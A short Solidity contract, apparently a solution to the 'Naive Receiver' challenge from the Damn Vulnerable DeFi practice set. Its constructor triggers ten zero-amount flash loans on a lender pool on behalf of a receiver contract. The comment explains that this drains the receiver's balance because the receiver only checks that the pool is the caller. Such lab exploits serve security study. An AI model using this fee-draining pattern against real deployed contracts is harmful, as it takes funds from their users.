// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveExploit {
    /**
     * Since the receiver only checks that the transaction is sent by the pool, but anyone can trigger the
     * flash loan via the pool, if you call a 0 flash load 10 times you can drain the user's balance.
     */
    constructor(NaiveReceiverLenderPool pool, FlashLoanReceiver receiver) {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(address(receiver), 0);
        }
    }
}
